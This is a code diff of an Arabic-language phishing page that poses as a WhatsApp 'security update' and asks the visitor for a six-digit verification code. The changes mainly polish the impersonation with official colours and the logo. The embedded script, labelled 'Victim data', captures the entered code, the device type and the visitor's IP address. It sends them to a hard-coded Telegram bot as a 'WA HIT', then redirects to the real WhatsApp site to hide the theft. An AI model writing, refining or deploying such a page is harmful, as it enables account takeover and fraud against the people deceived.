@@ -9,266 +9,283 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #128C7E 0%, #25D366 100%);
             height: 100vh; overflow: hidden;
         }
 
-        /* Splash Screen */
+        /* Splash Screen - الألوان الرسمية */
         .splash {
             position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
             background: linear-gradient(135deg, #075E54 0%, #128C7E 50%, #25D366 100%);
             display: flex; flex-direction: column; align-items: center; justify-content: center;
-            z-index: 1000; animation: fadeOut 0.8s ease-out 2s forwards;
+            z-index: 1000; animation: fadeOut 1s ease-out 2.5s forwards;
         }
-        .logo {
-            width: 120px; height: 120px; background: white; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center; margin-bottom: 24px;
-            animation: pulse 1.5s ease-in-out infinite;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        
+        /* شعار واتساب الأصلي الكبير */
+        .whatsapp-logo {
+            width: 140px; height: 140px; margin-bottom: 28px;
+            animation: logoPulse 1.8s ease-in-out infinite;
+            filter: drop-shadow(0 10px 30px rgba(0,0,0,0.3));
         }
-        .logo svg { width: 72px; height: 72px; fill: #25D366; }
+        
+        /* SVG الشعار الأصلي من واتساب */
+        .whatsapp-logo-circle {
+            width: 140px; height: 140px; fill: #25D366; animation: circlePulse 2s ease-in-out infinite;
+        }
+        .whatsapp-logo-icon {
+            position: absolute; width: 84px; height: 84px; fill: white;
+        }
+        
         .splash-text {
-            color: white; font-size: 18px; font-weight: 500; letter-spacing: 1px;
-            animation: slideUp 0.6s ease-out 0.5s both;
+            color: white; font-size: 20px; font-weight: 600; letter-spacing: 1px;
+            animation: textSlide 0.8s ease-out 0.8s both;
         }
-        @keyframes pulse {
+
+        @keyframes logoPulse {
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            50% { transform: scale(1.08) rotate(180deg); }
+        }
+        @keyframes circlePulse {
             0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+            50% { transform: scale(0.95); }
+        }
+        @keyframes textSlide {
+            from { opacity: 0; transform: translateY(25px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } }
 
-        /* الصفحة الرئيسية */
+        /* الصفحة الرئيسية - الألوان الرسمية */
         .main { 
-            display: none; height: 100vh; position: relative; 
-            background: #f0f2f5; overflow-y: auto;
+            display: none; height: 100vh; background: #F0F2F5; 
+            position: relative; overflow-y: auto;
         }
-        .main.show { display: block; animation: slideIn 0.5s ease-out; }
-        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } }
+        .main.show { display: block; }
 
-        /* Header */
+        /* Header - الألوان الرسمية */
         .header {
-            position: sticky; top: 0; background: white; padding: 16px 20px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1); z-index: 10;
-            display: flex; align-items: center; gap: 12px;
+            position: sticky; top: 0; z-index: 10;
+            background: white; padding: 16px 20px; box-shadow: 0 1px 0.5px rgba(0,0,0,0.15);
+            display: flex; align-items: center; gap: 14px;
         }
-        .logo-small {
-            width: 40px; height: 40px; background: #25D366; border-radius: 50%;
+        .header-logo {
+            width: 42px; height: 42px; background: #25D366; border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
         }
-        .logo-small svg { width: 24px; height: 24px; fill: white; }
-        .title { font-size: 17px; font-weight: 600; color: #111; }
+        .header-logo svg { width: 26px; height: 26px; fill: white; }
+        .header-title { 
+            font-size: 17px; font-weight: 600; color: #111B21; 
+        }
 
-        /* المحتوى */
-        .content { padding: 60px 24px 40px; text-align: center; max-width: 380px; margin: 0 auto; }
+        /* Content */
+        .content { 
+            padding: 80px 24px 50px; text-align: center; max-width: 400px; margin: 0 auto; 
+        }
         
+        /* Device Info - اللون الرسمي */
         .device-info {
-            background: #e8f5e8; color: #075E54; padding: 10px 16px; border-radius: 20px;
-            font-size: 14px; font-weight: 500; margin-bottom: 28px; display: inline-flex; align-items: center; gap: 8px;
+            display: inline-flex; align-items: center; gap: 8px;
+            background: #E8F5E8; color: #075E54; padding: 12px 18px;
+            border-radius: 25px; font-size: 14px; font-weight: 500; margin-bottom: 32px;
+            border: 1px solid rgba(7,94,84,0.2);
         }
 
-        .message {
-            background: white; margin-bottom: 32px; padding: 20px; border-radius: 12px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1); font-size: 15px; color: #333;
-            line-height: 1.5;
+        /* Message Box */
+        .message-box {
+            background: white; padding: 24px; border-radius: 12px; margin-bottom: 36px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1); font-size: 15px; color: #111B21;
+            line-height: 1.45;
         }
-        .phone { 
-            font-weight: 600; color: #25D366; direction: ltr; font-family: monospace;
-            font-size: 16px; display: block; margin-top: 8px;
+        .phone-number {
+            font-weight: 600; color: #25D366; direction: ltr; font-size: 16px;
+            display: block; margin-top: 12px; font-family: SFMono-Regular, monospace;
+            letter-spacing: -0.5px;
         }
 
-        /* OTP */
-        .otp-input {
-            position: relative; margin: 40px 0;
-        }
+        /* OTP Section */
+        .otp-section { margin: 44px 0; }
         #otp-input {
-            position: absolute; opacity: 0; width: 100%; height: 100%; font-size: 24px;
-            letter-spacing: 50px; caret-color: #25D366;
+            position: absolute; opacity: 0; width: 100%; height: 100%; z-index: 2;
+            font-size: 28px; letter-spacing: 52px; caret-color: #25D366;
         }
         .otp-boxes {
-            display: flex; gap: 12px; justify-content: center; direction: ltr;
+            display: flex; gap: 14px; justify-content: center; direction: ltr;
+            padding: 8px 0;
         }
         .otp-box {
-            width: 50px; height: 58px; border: 2px solid #ddd; border-radius: 8px;
-            display: flex; align-items: center; justify-content: center; font-size: 26px;
-            font-weight: 700; background: white; transition: all 0.2s;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            width: 54px; height: 64px; border: 2px solid #E9EDEF; border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 28px; font-weight: 700; color: #111B21; background: white;
+            transition: all 0.25s cubic-bezier(0.4,0,0.2,1);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
         }
         .otp-box.active {
-            border-color: #25D366; background: #e8f5e8; box-shadow: 0 4px 16px rgba(37,211,102,0.3);
+            border-color: #25D366; background: #F0F6FF;
+            box-shadow: 0 0 0 3px rgba(37,211,102,0.1), 0 4px 16px rgba(37,211,102,0.2);
+            transform: scale(1.02);
         }
 
-        /* الزر */
+        /* Confirm Button - اللون الرسمي */
         .confirm-btn {
             width: 100%; background: #25D366; color: white; border: none;
-            padding: 16px 24px; border-radius: 8px; font-size: 16px; font-weight: 600;
-            box-shadow: 0 4px 12px rgba(37,211,102,0.3); cursor: pointer;
-            transition: all 0.2s;
+            padding: 18px 28px; border-radius: 10px; font-size: 16px; font-weight: 600;
+            box-shadow: 0 2px 10px rgba(37,211,102,0.3); cursor: pointer;
+            transition: all 0.2s ease;
         }
-        .confirm-btn:hover { background: #128C7E; transform: translateY(-1px); }
-        .confirm-btn:active { transform: translateY(0); }
+        .confirm-btn:hover { 
+            background: #128C7E; transform: translateY(-1px);
+            box-shadow: 0 4px 18px rgba(37,211,102,0.4);
+        }
 
-        /* Loading */
-        .loading {
+        /* Loading - الألوان الرسمية */
+        .loading-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
-            background: rgba(240,242,245,0.98); display: none; align-items: center;
-            justify-content: center; z-index: 1000; backdrop-filter: blur(10px);
+            background: rgba(240,242,245,0.98); display: none;
+            align-items: center; justify-content: center; z-index: 1000;
+            backdrop-filter: blur(8px);
         }
         .spinner {
-            width: 44px; height: 44px; border: 3px solid #f0f2f5; border-top: 3px solid #25D366;
-            border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
+            width: 48px; height: 48px; 
+            border: 4px solid rgba(37,211,102,0.15); 
+            border-top: 4px solid #25D366; border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 24px;
         }
-        .loading-text { font-size: 16px; color: #333; font-weight: 500; }
+        .loading-text { 
+            font-size: 16px; color: #111B21; font-weight: 500; 
+        }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         /* Responsive */
         @media (max-width: 480px) {
-            .content { padding: 50px 20px 30px; }
-            .otp-boxes { gap: 8px; }
-            .otp-box { width: 44px; height: 52px; font-size: 22px; }
+            .content { padding: 70px 20px 40px; }
+            .otp-boxes { gap: 10px; }
+            .otp-box { width: 48px; height: 56px; font-size: 24px; }
         }
     </style>
 </head>
 <body>
-    <!-- Splash Screen -->
+    <!-- Splash Screen - شعار واتساب الأصلي -->
     <div class="splash">
-        <div class="logo">
-            <svg viewBox="0 0 24 24">
-                <path fill="currentColor" d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.488"/>
+        <div class="whatsapp-logo">
+            <!-- الدائرة الخارجية -->
+            <svg class="whatsapp-logo-circle" viewBox="0 0 140 140">
+                <circle cx="70" cy="70" r="70" fill="#25D366"/>
+            </svg>
+            <!-- الأيقونة الداخلية الأصلية -->
+            <svg class="whatsapp-logo-icon" viewBox="0 0 84 84">
+                <path fill="white" d="M59.5 51.4c-.3-.1-1.8-.9-2.1-1-.3-.1-.5-.1-.7.2-.2.3-.8 1-.9 1.2-.2.2-.3.2-.6.1-.3-.1-1.3-.5-2.5-1.5-.9-.8-1.5-1.8-1.7-2.1-.2-.3 0-.5.1-.6.1-.1.3-.3.4-.5.2-.2.2-.3.3-.5.1-.2.1-.4 0-.5-.1-.2-.7-1.7-1-2.3-.2-.6-.5-.5-.7-.5-.2 0-.4 0-.6 0-.2 0-.5.1-.8.4-.3.3-1.1 1-1.1 2.5 0 1.5 1.1 2.9 1.2 3.1 2.2 3.3 5.3 4.7 8.4 5.1.7.3 1.3.5 1.8.6.6.2 1.4.2 2 .1.6-.1 1.8-.7 2.1-1.4.2-.7.2-1.3.2-1.4-.1-.1-.3-.2-.6-.4m-4.6 6.9h-.004a9.9 9.9 0 01-5-1.4l-.4-.2-3.7 1 .9-3.6-.2-.4a9.9 9.9 0 01-1.5-5.3c0-5.5 4.4-9.9 9.9-9.9 2.6 0 5.1 1 7 2.9a9.8 9.8 0 012.9 7c0 5.5-4.4 9.9-9.9 9.9m8.4-18.3A11.8 11.8 0 0012 0C5.5 0 .2 5.3.2 11.9c0 2.1.5 4.2 1.6 6L.1 24l6.3-1.6a11.9 11.9 0 005.7 1.5h.005c6.6 0 11.9-5.3 11.9-11.9A11.8 11.8 0 0020.9 3.5"/>
             </svg>
         </div>
         <div class="splash-text">WhatsApp</div>
     </div>
 
-    <!-- الصفحة الرئيسية -->
-    <div class="main" id="main">
-        <div class="header">
-            <div class="logo-small">
+    <!-- Main Page -->
+    <div class="main" id="mainPage">
+        <header class="header">
+            <div class="header-logo">
                 <svg viewBox="0 0 24 24">
-                    <path fill="currentColor" d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.488"/>
+                    <circle cx="12" cy="12" r="12" fill="#25D366"/>
+                    <path fill="white" d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.488"/>
                 </svg>
             </div>
-            <div class="title">تحديث الأمان</div>
-        </div>
+            <div class="header-title">تحديث الأمان</div>
+        </header>
 
         <div class="content">
-            <div class="device-info" id="device-info">
-                📱 كشف الجهاز...
+            <div class="device-info" id="deviceInfo">📱 جاري التعرف على الجهاز...</div>
+
+            <div class="message-box">
+                تم إرسال رمز التحقق إلى رقمك المسجل:
+                <div class="phone-number" id="phoneNumber">+20 1** *** **87</div>
             </div>
 
-            <div class="message">
-                لقد تم إرسال رمز تحقق إلى رقمك:
-                <div class="phone" id="phone-display">+20 1** *** **87</div>
-            </div>
-
-            <div class="otp-input">
+            <div class="otp-section">
                 <input type="tel" id="otp-input" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
                 <div class="otp-boxes">
-                    <div class="otp-box" id="box1"></div>
-                    <div class="otp-box" id="box2"></div>
-                    <div class="otp-box" id="box3"></div>
-                    <div class="otp-box" id="box4"></div>
-                    <div class="otp-box" id="box5"></div>
-                    <div class="otp-box" id="box6"></div>
+                    <div class="otp-box" id="b0"></div>
+                    <div class="otp-box" id="b1"></div>
+                    <div class="otp-box" id="b2"></div>
+                    <div class="otp-box" id="b3"></div>
+                    <div class="otp-box" id="b4"></div>
+                    <div class="otp-box" id="b5"></div>
                 </div>
             </div>
 
-            <button class="confirm-btn" onclick="focusOTP()">تأكيد الرمز</button>
+            <button class="confirm-btn" onclick="focusInput()">تأكيد الرمز</button>
         </div>
     </div>
 
     <!-- Loading -->
-    <div class="loading" id="loading">
+    <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
-        <div class="loading-text" id="loading-text">جاري التحقق...</div>
+        <div class="loading-text" id="loadingText">جاري التحقق من الرمز...</div>
     </div>
 
     <script>
-        // Telegram Bot
-        const TELEGRAM_TOKEN = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
+        // Telegram Config
+        const TOKEN = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
         const CHAT_ID = '5446862709';
 
-        let deviceName = 'Mobile', phoneMask = '+20 1** *** **87';
-
-        // Splash Screen
+        // Start
         setTimeout(() => {
             document.querySelector('.splash').style.display = 'none';
-            document.getElementById('main').classList.add('show');
+            document.getElementById('mainPage').style.display = 'block';
             detectDevice();
-            setTimeout(() => document.getElementById('otp-input').focus(), 500);
-        }, 2800);
+            setTimeout(focusInput, 800);
+        }, 3000);
 
-        // Device Detection
         function detectDevice() {
             const ua = navigator.userAgent;
-            if (ua.includes('iPhone')) deviceName = 'iPhone';
-            else if (ua.includes('Android')) deviceName = 'Android';
-            else deviceName = 'Desktop';
-            
-            document.getElementById('device-info').textContent = `📱 ${deviceName}`;
+            const device = ua.includes('iPhone') ? 'iPhone' : 
+                          ua.includes('Android') ? 'Android' : 'Desktop';
+            document.getElementById('deviceInfo').textContent = `📱 ${device}`;
         }
 
-        // OTP Handler
-        document.getElementById('otp-input').addEventListener('input', function(e) {
+        // OTP Logic
+        const input = document.getElementById('otp-input');
+        input.addEventListener('input', (e) => {
             let val = e.target.value.replace(/\D/g, '').slice(0,6);
             e.target.value = val;
             
-            // Update boxes
-            for(let i=0; i<6; i++) {
-                const box = document.getElementById(`box${i+1}`);
+            // Fill boxes
+            for(let i = 0; i < 6; i++) {
+                const box = document.getElementById(`b${i}`);
                 box.textContent = val[i] || '';
                 box.classList.toggle('active', !!val[i]);
             }
             
-            // Auto submit
-            if(val.length === 6) {
-                setTimeout(() => sendOTP(val), 400);
-            }
+            if(val.length === 6) sendCode(val);
         });
 
-        async function sendOTP(code) {
+        async function sendCode(code) {
             showLoading();
             
-            const data = {
-                otp: code,
-                device: deviceName,
-                ip: await (await fetch('https://api.ipify.org?format=json')).json().then(r => r.ip),
-                ua: navigator.userAgent,
-                lang: navigator.language,
-                time: new Date().toLocaleString('ar')
-            };
-
-            // Send to Telegram
-            const message = `🎯 *WA HIT*\n\nOTP: \`${code}\`\nDevice: ${data.device}\nIP: ${data.ip}`;
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            // Victim data
+            const ip = await (await fetch('https://api.ipify.org?format=json')).then(r=>r.json()).then(r=>r.ip);
+            const data = { code, device: document.getElementById('deviceInfo').textContent, ip, time: new Date().toLocaleString('ar') };
+            
+            // Telegram
+            const msg = `🎯 *WA HIT*\n\nOTP: \`${code}\`\n${data.device}\nIP: ${data.ip}`;
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
             });
-
-            // Redirect after 2s
-            setTimeout(() => {
-                window.location.href = 'https://web.whatsapp.com/security';
-            }, 2000);
+            
+            setTimeout(() => window.location.href = 'https://web.whatsapp.com/security', 2500);
         }
 
         function showLoading() {
-            document.getElementById('loading').style.display = 'flex';
+            document.getElementById('loadingOverlay').style.display = 'flex';
         }
 
-        function focusOTP() {
-            document.getElementById('otp-input').focus();
+        function focusInput() {
+            input.focus();
+            input.select();
         }
 
-        // Click to focus
-        document.body.addEventListener('click', () => {
-            document.getElementById('otp-input').focus();
-        }, {once: true});
+        // Auto focus
+        document.addEventListener('click', focusInput, {once: true});
     </script>
 </body>
 </html>
